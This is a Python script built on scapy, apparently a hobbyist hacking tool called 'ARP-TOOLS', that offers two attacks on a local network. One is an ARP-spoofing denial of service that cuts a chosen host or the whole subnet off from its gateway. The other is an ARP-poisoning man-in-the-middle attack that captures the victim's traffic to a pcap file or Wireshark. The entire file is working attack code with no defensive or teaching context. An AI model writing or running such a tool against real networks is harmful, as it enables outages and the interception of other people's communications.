#! /usr/bin/python3

from scapy.all import *
import os 
import subprocess
import time

os.system("clear")

print("#################")
print("#   ARP-TOOLS   #")
print("#################")
print("By Dark Shadow")
print(" ")

def arp_tools():
	if not "SUDO_UID" in os.environ.keys():
		print("Run program with sudo.")
		exit()
	print("Menue : ")
	print("1. ARP DOS")
	print("2. ARP MITM")
	menue=input("Enter a choice : ")
	if menue == "1" or menue == "1." or menue == "one":
		print("Tool 1 selected.")
		subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"])
		subnet = input("Enter your subnet : ")
		arp = ARP(pdst=subnet)
		ether = Ether(src="00:11:22:33:44:55",dst="ff:ff:ff:ff:ff:ff")
		packet = ether/arp
		result = srp(packet, timeout=2, verbose=0)[0]
		print("Subnet scan : ")
		for sent, recived in result:
			print(f"IP : {recived.psrc}" + "	" + f"MAC : {recived.hwsrc}")
		target = input("Enter a target or 'all' for all : ")
		if target == "all":
			target = subnet
		target_mac = input("Enter target mac : ")
		gateway = input("Enter the gateway (router) ip : ")
		arp_target = ARP(op=2, psrc=gateway, hwdst=target_mac, pdst=target)
		ether_target = Ether(dst=target_mac)
		pkt_target = ether/arp_target
		print("Dos started ;)")
		print("Sending packets ...")
		try:
			while True:
				sendp(pkt_target, verbose=False)
				time.sleep(.5)
		except:
			print("Failed to send packets.")
	elif menue == "2" or menue == "2." or menue == "two":
		print("Tool 2 selected.")
		subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"])
		subnet = input("Enter your subnet : ")
		arp = ARP(pdst=subnet)
		ether = Ether(src="00:11:22:33:44:55",dst="ff:ff:ff:ff:ff:ff")
		packet = ether/arp
		result = srp(packet, timeout=2, verbose=0)[0]
		print("Subnet scan : ")
		for sent, recived in result:
			print(f"IP : {recived.psrc}" + "	" + f"MAC : {recived.hwsrc}")
		target = input("Enter a target or 'all' for all : ")
		if target == "all":
			target = subnet
		target_mac = input("Enter target mac : ")
		gateway = input("Enter the getway (router) IP : ")
		gateway_mac = input("Enter the gateway mac : ")
		c_dir = os.getcwd()
		os.chdir("/sys/class/net")
		interfaces = os.listdir()
		os.chdir(c_dir)
		arp_target = ARP(op=2, psrc=gateway, hwdst=target_mac, pdst=target)
		ether_target = Ether(dst=target_mac)
		pkt_target = ether/arp_target
		arp_gateway = ARP(op=2, psrc=target, hwdst=gateway_mac, pdst=gateway)
		ether_gateway = Ether(dst=gateway_mac)
		pkt_gateway = ether/arp_gateway
		print("Sending packets ...")
		def capture(pkt):
			print("Capturing packets... Press ctrl^c to exit.")
			wrpcap("packets.pcap", pkt, append=True)
		try:
			for x in range(1, 10):
				sendp(pkt_target, verbose=False)
				time.sleep(.5)
				sendp(pkt_gateway, verbose=False)
				time.sleep(.5)
			print("Target arp table spoofed.")
			time.sleep(3)
			def menue():
				print("Packet's saving menue.")
				print("1. Open Wireshark")
				print("2. Save to file.")
				choice = input("Enter here : ")	
				if choice == "1." or choice == "1" or choice == "wireshark":
					os.system("wireshark")
				elif choice == "2." or choice == "2" or choice == "file" or choice == "save to file":
					print("Starting...")
					time.sleep(1)
					pkts = sniff(iface=interfaces, store=False, prn=capture)
				else:
					print("Wrong input!")
					menue()
			menue()		
		except KeyboardInterrupt:	
			print(f"Captured packets in packets.pcap at {c_dir}")
	else:
		print("Wrong Input! Try again...")
		arp_tools()
arp_tools()
